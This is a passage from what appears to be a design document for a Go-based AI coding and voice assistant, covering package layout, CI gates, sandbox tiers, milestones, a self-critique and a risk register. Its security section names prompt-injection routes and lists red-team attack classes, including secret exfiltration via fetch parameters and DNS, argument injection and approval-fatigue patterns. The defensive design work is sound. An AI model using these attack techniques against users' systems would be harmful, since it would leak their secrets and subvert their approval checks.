│  ├─ core/             ← PUBLIC API. types, Tool, Provider, Bus, Capability, events
│  ├─ config/
│  └─ log/
├─ profiles/            personas/ · mcp/ · security/     (data, not code)
├─ docs/                DESIGN.md (this) · adr/ · packages/<name>/DECISIONS.md
└─ testdata/            cassettes/ · fixtures/ · scenarios/ · redteam/
```

**Why `pkg/core` is the only public surface.** If backends are swappable, `core`'s
interfaces are an API contract with a compatibility policy (C15). Everything else
sits under `internal/` so the compiler prevents accidental external coupling and we
stay free to refactor. Promoting a package out of `internal/` is a deliberate,
reviewed act.

**Per-package required files:** `README.md` (30 lines max — what it does, what it
depends on, how to swap its backend), `DECISIONS.md` (dated ADR entries), `doc.go`,
`<name>test/` (the contract suite alternative implementations must pass), and a
`CODEOWNERS` entry.

**How separation is actually enforced** (this is the part that does the work D-01
would otherwise have done):

- `deps.yaml` declares, per package, exactly which packages it may import. `make
  lint-deps` walks the import graph and fails the build on any edge not listed. Layer
  violations are caught in CI, not in review.
- `CODEOWNERS` per package directory, so ownership is unambiguous across the team.
- Cross-package types **MUST** live in `pkg/core`. A type defined in `internal/mcp`
  and used by `internal/brain` is a review blocker — that is the smell D-01 was
  meant to prevent, and the lint catches it directly.
- Every package exposes its behaviour through an interface consumed elsewhere; no
  package reaches into another's concrete types.

**Build gates (CI, all blocking):** `go vet` · `staticcheck` · `golangci-lint` ·
`make lint-deps` (import graph) · unit tests with `-race` · `teatest` golden frames ·
cassette replay eval · red-team suite (zero violations) · `govulncheck` ·
cross-compile matrix (linux/amd64, linux/arm64, darwin/amd64, darwin/arm64) with
`CGO_ENABLED=0`.

---

## 9. Security model detail

### 9.1 Threat model

| Actor | Capability | We defend? |
|---|---|---|
| Confused/hallucinating model | emits any tool call | **Yes** — primary design goal |
| Prompt injection via web page / repo file / MCP result | steers the model | **Yes** — §5.12.4, partial |
| Malicious MCP server | arbitrary code as user | **Partial** — sandbox + pinning + provenance |
| Malicious skill | prompt text only, no code | **Yes** — untrusted tier |
| Compromised provider endpoint | sees all context, steers model | **Partial** — local models, redaction |
| Local malware already on the box | everything | **No** — out of scope |
| Physical/kernel attacker | everything | **No** |

### 9.2 Sandbox tiers

| Tier | Linux | macOS | Applies to |
|---|---|---|---|
| `strict` | user ns + landlock (ro scratch) + seccomp + no net | `sandbox-exec` deny-all + allowlist | MCP default |
| `workspace` | landlock rw on workspace, net allowlist | sandbox-exec profile | `exec` default |
| `host` | none | none | `yolo` only |

### 9.3 `fetch` hardening

DNS rebinding protection (resolve once, dial the resolved IP, verify SNI); block
RFC1918/link-local/metadata IPs unless explicitly granted; redirect chain re-validated
against the host allowlist at every hop; response size and time caps; content
sanitised to markdown with scripts stripped and injected into the prompt inside an
untrusted delimiter.

### 9.4 Red-team suite (blocking gate)

Minimum 200 cases across: direct instruction to violate policy; injected instructions
in fetched content, file contents, filenames, MCP results, and `SKILL.md`; path
traversal and symlink races; capability confusion through subagents; secret
exfiltration via `fetch` query params, DNS, and error messages; `exec` argument
injection; approval-fatigue patterns (100 benign approvals then one malicious).
**Gate: zero successful violations. A single failure blocks the release.**

---

## 10. Milestones

| # | Name | Contains | Exit criterion |
|---|---|---|---|
| M0 | Skeleton | `pkg/core`, `config`, `log`, single-module layout, CI, `deps.yaml` | `asst version` builds on 4 platforms; `lint-deps` blocking and green |
| M1 | Text loop | `ai`, `brain`, `tools`, `coretools`, minimal `cli` | fixes a failing test in a fixture repo, end to end |
| M2 | Enforcement | `security` broker, sandbox tiers, approval UX | red-team suite green; `paranoid` provably blocks writes |
| M3 | Ecosystem | `mcp`, `skills`, palette, tools inspector, **`Registry.Prune`** | 10 public MCP servers install and work from a pin, **with zero lines of per-server Go code**, and tool-schema tokens stay under 6k with all 10 loaded |
| M4 | Voice | `voicein`, `voiceout`, audio helper, selective speech | full voice turn ≤ 900 ms to first syllable |
| M5 | Rigour | `eval`, `session`, traces, cassettes, scorecard | replay-based regression suite runs per-PR |
| M6 | Swarm | `swarm`, subagent tool, budgets | a 3-subagent research task completes within budget |

M1→M2 ordering is deliberate: enforcement arrives before the ecosystem that makes it
necessary. Do not reorder.

---

## 11. Critique of this design

Written adversarially, as requested. The idea is fixed; these are execution risks and
gaps in the original sketch.

**C1 — Module granularity. `RESOLVED → D-01.`** Original concern: sixteen `go.mod`
files would mean sixteen version bumps per `core` change plus diamond-dependency
risk. Resolved as one Go module with feature packages (§8) — which is what the brief
meant by "modular" in the first place. The residual risk is that feature packages
without `go.mod` walls quietly grow cross-imports until the separation is nominal.
That risk is real and is mitigated mechanically by `deps.yaml` + `make lint-deps`,
not by review discipline. **If that lint is ever made non-blocking, C1 is back.**

**C2 — "Hotswappable to any provider" has a Go-shaped problem.** Go plugins
(`plugin.so`) are effectively unusable: same-compiler, same-flags, Linux-only, no
unloading. If third parties should add backends without recompiling, the extension
point must be **out-of-process** (a small gRPC/stdio adapter protocol, or just "it's an
MCP server"). Config-time swapping among *compiled-in* backends is easy and probably
sufficient — but say which one you mean, because they have wildly different costs.
**Recommendation:** compiled-in registry for v1; document an out-of-process adapter
protocol for v2; never promise Go plugins.

**C3 — Loading arbitrary MCP servers is in tension with the security promise.
`PARTIALLY RESOLVED → D-02.`** The integration-cost half is settled: one generic
client, zero per-server code, servers are config (§5.7). The security half stands.
"Loads any public MCP repository" and "extremely secure" reconcile only if every
server is sandboxed by default — and some servers will break under `strict`,
generating steady pressure to relax the default. The position to hold, in public:
**sandbox-by-default; a server needing more says so loudly at install time and the
user grants it explicitly.** Two consequences to plan for now rather than discover:
(a) a curated "verified" profile set will become necessary, because most users will
not evaluate a provenance card honestly on the twentieth server; (b) a
`--sandbox=host` flag will get copy-pasted from a GitHub issue by someone debugging a
broken server, and it should therefore be sticky-visible in the status bar
(§7.2) rather than silent.

**C4 — The `<speak>` tag mechanism is fragile alone.** Addressed by the tiered design
in §5.11, but flagged: the original sketch assumes model compliance. A 7B local model
will forget the tags. Tier 3 (fallback summariser) is load-bearing, not optional.

**C5 — Tool-count explosion. `RESOLVED → D-03.`** 12 MCP servers ≈ 300 tools ≈ 40k
tokens of schemas before the user types anything; on a 32k local model the app is
unusable the day MCP lands. `Registry.Prune` (§5.5) is therefore an M3 exit criterion,
shipping *with* MCP rather than after it. Two mechanisms, both in M3: static tool
groups for deterministic pruning, and lazy disclosure for MCP specifically — expose
one `mcp.<server>.list_tools` per server and expand on demand, mirroring how skills
already work (§5.8). Measure with `tokens_of_tool_schemas` in the eval scorecard so
the regression is visible the moment someone adds a chatty server.

**C6 — "The user is central" cannot be a prompt.** Addressed in §6.4, but this was the
biggest gap in the brief: it was written as an instruction-prompt concern. It has to be
a state machine with persistence, or it fails exactly when it matters (long tasks,
overnight runs, voice mode where a missed question is invisible).

**C7 — No persistence in the original list.** Added as §5.15. Without it, eval replay
is impossible and a crash is catastrophic.

**C8 — Audio + CGO + "single static binary" is a genuine trilemma.** §5.10 resolves it
with a helper process, but this is real engineering cost that should be budgeted (~1–2
weeks) rather than discovered in M4.

**C9 — Voice-first and approval-modals conflict.** If the user is across the room
talking, a modal blocking on `[y/n]` is invisible. Voice mode needs spoken approval
prompts with a spoken/keyword response path, and a stricter default policy (fewer
things reach the ask tier) — or an explicit "voice mode is supervised-lite" stance.
Not addressed anywhere in the brief. **This needs a decision before M4.**

**C10 — Eval conflates four things.** Split as in §5.13. In particular, LLM-as-judge
scoring is *not* a regression test — it is noisy and expensive. Deterministic cassette
replay is what belongs in CI; judged scenarios run nightly.

**C11 — Multi-agent is the lowest value-per-unit-risk item on the list.** It is the
most fashionable and the most likely to produce an impressive demo and a bad product.
Keeping it at M6, behind `exp_swarm`, supervisor-worker only, is correct. Resist
scope growth here specifically.

**C12 — Nothing in the brief addresses cost and context budgets.** Added to `brain`
(§5.4). A user with a cloud provider needs a hard spend ceiling per turn and per day,
or the first runaway loop is a bad surprise.

**C13 — The persona system is an injection surface.** A shared "cool personas" repo is
an obvious future feature, and personas are prompt text with implied authority. §5.4.1
scopes them explicitly; keep that boundary bright.

**C14 — Observability of the *provider* is missing.** Local model performance varies
enormously (quantisation, context length, KV cache). Surface tok/s, TTFT, and
context-limit warnings in the status bar; users will otherwise blame the app for a
slow GGUF.

**C15 — No mention of updates or the module contract's stability.** If modules are
truly swappable, `core`'s interfaces are a public API. Version it, and add a
compatibility policy before third parties exist, not after.

---

## 12. Open questions register

| ID | Question | Owner | Needed by |
|---|---|---|---|
| OQ-01 | Native Windows support? | | M0 |
| OQ-02 | Bus ordering guarantees | | M0 |
| OQ-03 | Which config subtrees hot-reload | | M1 |
| OQ-04 | Normalise reasoning tokens across providers | | M1 |
| OQ-05 | Cold-context retrieval: grep or embeddings | | M2 |
| OQ-06 | Cross-session memory: built-in or skill | | M3 |
| OQ-07 | Surface tool pruning in the UI | | M3 |
| OQ-08 | Ship `fs.patch` alongside `fs.edit` | | M1 |
| OQ-09 | Support MCP sampling requests | | M3 |
| OQ-10 | MCP roots and resource subscriptions | | M3 |
| OQ-11 | Skill capability grants | | M3 |
| OQ-12 | Inline (non-altscreen) render mode | | M1 |
| OQ-13 | Audio helper process vs build tags | | M4 |
| OQ-14 | Wake-word engine | | post-v1 |
| OQ-15 | May tool results speak | | M4 |
| OQ-16 | Behaviour when Landlock is unavailable | | M2 |
| OQ-17 | Adopt an external benchmark | | M5 |
| OQ-18 | Subagent UI presentation | | M6 |
| OQ-19 | Session encryption at rest | | M5 |
| OQ-20 | Confidence signal for ambiguity detection | | M2 |
| ~~OQ-21~~ | ~~One Go module or sixteen~~ | — | **CLOSED → D-01: one module, feature packages** |

## 13. Risk register

| ID | Risk | Severity | Mitigation | §|
|---|---|---|---|---|
| R-01 | Malicious/compromised MCP package | High | pinning, integrity, sandbox, provenance card | 5.7 |
| R-02 | Prompt injection via workspace `SKILL.md` | High | untrusted tier, no capability declaration | 5.8 |
| R-03 | Broker compromise via IPC bug | High | small surface, fuzzed protocol, OS sandbox below | 4.4 |
| R-04 | Persona used to widen permissions | Med | grants live in broker, personas are prompt-only | 5.4.1 |
| R-05 | Local models emit malformed tool calls | High | repair shim, quirk metrics | 5.3 |
| R-06 | Tool/schema token blowup | High | `Prune`, lazy MCP disclosure | 5.5, C5 |
| R-07 | TUI render thrash on token streams | Med | 30 fps coalescer, render cache | 5.9 |
| R-08 | Bus drops hide state from the user | Med | explicit `EventsDropped` UI marker | 5.1 |
| R-09 | Secret leakage into context or traces | High | broker-side resolution, value+pattern redaction | 5.12.3 |
| R-10 | CGO breaks single-binary distribution | Med | helper processes, HTTP-based local STT | 5.10 |
| R-11 | Selective speech fails on small models | Med | tiered fallback summariser | 5.11 |
| R-12 | Injection→action in the same step | High | approval escalation on untrusted intake | 5.12.4 |
| R-13 | Subagent privilege escalation | High | intersection-only token derivation | 5.14 |
| R-14 | Approval fatigue → blind `y` | Med | irreversibility tiering, batched approvals, red-team case | 6.4 |
| R-15 | Voice mode hides blocking prompts | Med | spoken approvals; decision needed | C9 |
| R-16 | Feature-package boundaries erode without `go.mod` walls | Med | `deps.yaml` + blocking `lint-deps`, CODEOWNERS, shared types confined to `pkg/core` | 8, C1 |
| R-17 | Pressure to relax MCP sandbox defaults per broken server | Med | sticky status-bar indicator for relaxed sandboxes, curated verified profiles | C3 |
